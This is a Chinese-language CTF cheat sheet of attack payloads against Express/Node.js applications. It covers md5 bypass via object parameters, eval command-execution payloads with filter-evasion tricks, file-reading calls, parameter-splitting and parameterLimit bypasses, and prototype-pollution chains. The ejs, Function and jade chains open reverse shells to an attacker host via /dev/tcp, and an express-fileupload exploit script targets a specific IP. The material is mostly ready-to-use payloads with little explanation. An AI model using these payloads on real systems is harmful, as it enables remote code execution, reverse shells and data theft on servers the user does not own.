Express是一个流行的Node.jsWeb框架，它提供了许多有用的功能来构建Web应用程序。
如果响应头有X-Powered-By: Express

## **0x1、函数特性**
```
Character.toUpperCase()函数，字符ı会转变为I，字符ſ会变为S
Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k
```

绕过md5
```
 if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);

?a[x]=1&b[x]=2或者a[:]=1&b[:]=1
?a[x]=1&b[x]=2 相当于是说，a和b都是引用数据类型（对象类型），
a={'x':'1'}
b={'x':'2'}
那么在 a+flag和 b+flag 时，他们的结果就会都是［objectObject]flag{xxx}，那么md5值自然就是一样的了。
```


^
## **0x2、eval命令执行**

```
eval(require("child_process").execSync('ls'))


?eval=require("child_process").execSync('ls')

?eval=require('child_process').execSync('ls').toString()

?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require('child_process').spawnSync( 'ls', [ './' ] ).stdout.toString()

?eval=global.process.mainModule.constructor._load('child_process').execSync('ls')
```
```
//读文件夹，读文件函数
?eval=require('fs').readdirSync(".")
?eval=require('fs').readFileSync('./fl00g.txt','utf8');
```
```
//字符串拼接
?eval=var s='global.process.mainModule.constructor._lo';var b="ad('child_process').ex";var c="ec(%27ls>public/1.txt%27);";eval(s%2Bb%2Bc)%3B
```

^
有过滤exec|load。函数evalstring.search(/exec|load/i)
```
构造exec
?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
?eval=require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
```

查看目录和源码
```
?eval=__filename 可以看到路径为/app/routes/index.js 
?eval=__dirname  看到/app/routes/
?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
```

^
## **0x3、传参绕过**
#### **1、传json，不能有逗号，2c字符**
```
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }
});
```
```
/?query={"name":"admin","password":"ctfshow","isVIP":true} 被检测到,

nodejs会把同名参数以数组的形式存储，并且Json.parse可以正常解析。
同名参数绕过，这里还要把c进行url编码，否则"c会匹配到2c
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
或者直接
?query=%7b%22%6e%61%6d%65%22%3a%22%61%64%6d%69%6e%22&query=%22%70%61%73%73%77%6f%72%64%22%3a%22%63%74%66%73%68%6f%77%22&query=%22%69%73%56%49%50%22%3a%74%72%75%65%7d
```

^
#### **2、parameterLimit突破**
express提供了许多选项来配置参数解析。其中之一是parameterLimit选项。
parameterLimit选项用于指定query string 或者requestpayload的最大数量。默认情况下，它的值是1000。
如果你的应用程序需要解析大量的查询字符串或者请求负载，你可能需要增加这个限制。例如，如果你的应用程序需要处理非常长的查询字符串，你可以将parameterLimit设置为一个更高的值。

因此1000以后的参数将失效。
```
import json

datas = {"headers": ["xx:xx\nadmin: true"],        
    "params": {"admin": "true"}}

for i in range(1020):
    datas["params"]["x" + str(i)] = i

json1 = json.dumps(datas)
print(json1)
```

^
#### **3、请求头解析特性**


#### 第一种
```
{"headers": ["xx:xx\nadmin: true"]}
```
我们可以看到`admin`和`true`字符串都在第一个冒号后面，因此可以绕过PHP代码的检测，而在NodeJS解析时，会解析得到`admin`的字段为true.

#### 第二种
```
{"headers": ["admin: x", " true: y"]}
```
由于`admin`和`ture`出现在数组的两个元素中，因此可以绕过PHP文件的判断。在正常解析过程中，在键名中是不允许存在空格的，但NodeJS在遇到这类情况时是宽容的，会将其解析成
```
{"admin": "x true y"}
```




^
^
## **0x4、原型链污染**
类似于merge函数用于合并两个或多个对象的属性，将一个或多个源对象的属性复制到目标对象上。
可能造成原型链污染。
常见payload
```
{
    "username":"1",
    "password":"1",
     "__proto__":{"isAdmin":true}
}
```
```
 var secert = {};
 let user = {};
 utils.copy(user,req.body);  //这里的copy类似merge函数。req.body是入口
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }
```
已知secert是对象类型，secert的原型类就是Object。
```
如果在secert继承到Object中的一个类的prototype有ctfshow属性值为36dboy，
那么secert.ctfshow值也存在为36dboy。

又每一个对象都有__proto__属性，通过secert.__proto__可以修改父类的Object.prototype，结合copy函数和json最终修改Object类prototype，定义了一个ctfshow值为36dboy

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }

第一次循环，key 是 __proto__，因为每一个对象都有 __proto__ 属性，所以判断为TRUE，然后递归Q 调用copy函数。这次传参，object1 是object1['__proto__']，就是 object{....}，回溯到了Object类了
object2是object2['__proto__']， 就是{ ctfshow: "36dboy" }。此时 key为 ctfshow。因为Object没有ctfshow这个变量，所以经过判断为FALSE，进入else，执行 object1['ctfshow'」=object2［'ctfshow'］。
将Object类的ctfshow的值改为了 36dboy，那么所有继承object类的类都会有属性ctfshow=36dboy，
也就是所有类，因为所有类都是object的子类。
```
于是POST传递请求体
```
{"__proto__":{"ctfshow":"36dboy"}}
```






^
## **0x5、原型链污染组合**
#### **ejs模板漏洞导致rce**
package.json中存在ejs，"ejs": "^3.1.5"。
```
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
```
继承的继承场景
```
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/xxx 0>&1\"');var __tmp2"}}}
```

^
#### **污染函数Function创建的函数体，变成危险函数**
```
已知返回res.render('api', { query: Function(query)(query)});
```
污染query参数即可
```
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"')"}}


案例：
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
 var user ={}
 body=JSON.parse('{"__proto__":{"query":"return 123"}}');
 copy(user,body);
 console.log(Function(query)(query));
//输出 123
```

^
**继承的继承场景**
```
 var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
 utils.copy(user.userinfo,req.body);
 if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
```
req.body是入口，user.userinfo我们要通过这个污染Object,`userinfo` 的原型不是 `Object` 对象， `userinfo.__proto__.__proto__` 才是 `Object` 对象。
于是
```
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/IP/端口 0>&1\"')"}}
```



^
#### **jade原型链污染**
package.json中存在jade。
在login页面打上去之后随便访问下，就会反弹。
```
{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/810>&1\"')"}}}
```


^
#### **express-fileupload原型链污染**
"express-fileupload": "1.1.7-alpha.4"存在cve，其文件上传作为入口，配合ejs，污染ejs中outputFunctionName变量实现RCE
```
const fileUpload= require(' express--fileupload') ;
app.use(fileUpload({ parseNested: true })); //配置它以解析嵌套的文件字段
app.post('/4_pATh_yOu_CaNNO7_Gu3ss', (req, res) => {
       res.render(' flag.ejs');
}):
```
```
import requests

resp1 = requests.post("http://{}:{}/{}".format('61.147.171.105', '52139', '4_pATh_y0u_CaNN07_Gu3ss'),
        files={'__proto__.outputFunctionName': 
        (
            None, "x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x".format(cmd='cp /flag.txt /app/static/js/flag.txt')
        )})

print(resp1)
```